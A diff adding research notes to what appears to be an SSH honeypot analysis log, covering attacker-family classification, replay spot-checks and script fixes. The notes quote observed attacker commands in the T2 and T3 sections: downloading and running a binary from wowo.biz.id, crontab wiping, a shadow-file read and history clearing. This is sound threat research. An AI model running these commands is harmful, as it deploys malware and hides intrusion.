@@ -1389,3 +1389,82 @@ two things to check separately from phase B:
    anything else. would need a session timeline check across the full log history.
 separate task, touches the live Go server, not the python classification pipeline.
 not blocking phase B.
+
+2026-06-28 -- campaign-span check on 103.105.67.170 (98.9% of F15 sessions): first session
+2026-06-15 00:52, last 2026-06-15 05:27. full campaign ~4.5h, single day, not
+spread out. consistent with an automated mass-scan sweep, not a persistent
+monitor. (14793 sessions in under 5 hours is also a session rate worth noting
+on its own -- something like one connection every ~1-2 seconds.)
+
+---
+
+### phase B -- classify.py (2026-06-27)
+
+built analysis/classify.py. reads family_mapping.json + raw sessions, emits families.json.
+reuses RULES from cluster.py and session loading from fingerprint.py -- no logic copied.
+
+run on the full 22551-session dataset (2026-06-26.merged). all sanity checks passed:
+- F15: 3 IPs, 14954 sessions exactly
+- F1: 1030 IPs exactly
+- excluded_sids: 5 exactly
+
+final numbers:
+- 1465 IPs total
+- 15 families assigned
+- 23 multi-family IPs (legitimate -- same IP did credential stuffing + a payload family)
+- 30 unclassified IPs (TAIL + C16, correct, those have no family assigned by design)
+
+F2 stage breakdown per-session: 20 recon-only, 0 recon+kill, 28 recon+kill+execute.
+each F2 IP entry in families.json now carries stage_sessions [{sid, stage}] so individual
+sessions are auditable in phase C without re-running the classification.
+
+172.210.53.195 shows up as F1+F7+F12 -- credential stuffing attempts from the same IP that
+later ran the wowo session. expected, not an error.
+
+two small fixes after the first run: added per-session stage_sessions to F2 IP entries,
+replaced datetime.utcnow() with datetime.now(timezone.utc) to kill the python 3.12 warning.
+
+---
+
+### spot-check verification -- replay reads (2026-06-28)
+
+ran replay.py on mini logs (one pass per target IP) and read all four outputs.
+
+**T1 -- 35.200.201.144 (F1+F2)**
+
+37 sessions with commands: 9 stop at nvidia-smi Product Name line (recon_only), 28 end with
+the full crontab-r / chattr / ./randomBinary deploy (recon_kill_execute). binary name is
+different every session. the 20/28 aggregate in classify.py is across all F2 IPs -- this one
+contributes 9 of the 20 recon_only, not 20.
+
+F1 tag has no session-level backing in replay. every visible session is F2 recon. the F1
+label comes from auth.log (many unique passwords tried), not from a distinct session shape.
+27 of 64 sessions for this IP had zero shell/exec events and are invisible in replay. if I
+want to verify the F1 tag I need to look at auth.log directly, not the replay.
+
+**T2 -- 176.61.50.14 (F13)**
+
+clean. 2 upload sessions (scp -t /tmp/gJw27HGL + [scp file: tuLtUp8R 4745 bytes] +
+[quarantined: sha256=6d1fe6ab...]), 2 execute sessions (cd /tmp && chmod +x gJw27HGL &&
+bash -c ./gJw27HGL). same IP, same Raspbian banner, all 10:40 Rabat Jun 2. single infected
+Pi node, two upload attempts + two execute attempts, both halves confirmed.
+
+**T3 -- 172.210.53.195 (F1+F7+F12)**
+
+one session, d9ddf36a96d3, 41 commands. first 40 are the F7 recon shape: env dump, network
+interfaces, which apt/yum/pacman/zypper, ping 8.8.8.8, dd benchmark, ss -tuln, shadow read
+attempt. command 41 is the F12 wowo deploy: chmod 777 /usr/bin/curl; curl -O
+http://wowo.biz.id/wowiloveyou/runningaway.x86; ./runningaway.x86 vipies; rm; history -c.
+no gap, one continuous session, F7 recon flows directly into F12 deploy.
+
+F1 tag same situation as T1 -- auth-only sessions invisible in replay, no session-level
+backing for the F1 label in the command data.
+
+**T4 -- 103.105.67.170 (F15)**
+
+SESSION 0002b78e015a: echo -e "\x6F\x6B", 0s, nothing else. confirmed.
+
+also fixed a display bug in replay.py during this session: ECHO_RE was matching the ok-beacon
+(no >> redirect) and rendering it as "[echo chunk -> ? (~0.0 KB)]". fix: only classify as
+echo inject when echo_target(cmd) != "?". affected 14954 sessions (all F15), none in the
+main replay file since --min-cmds 3 filtered them out anyway.
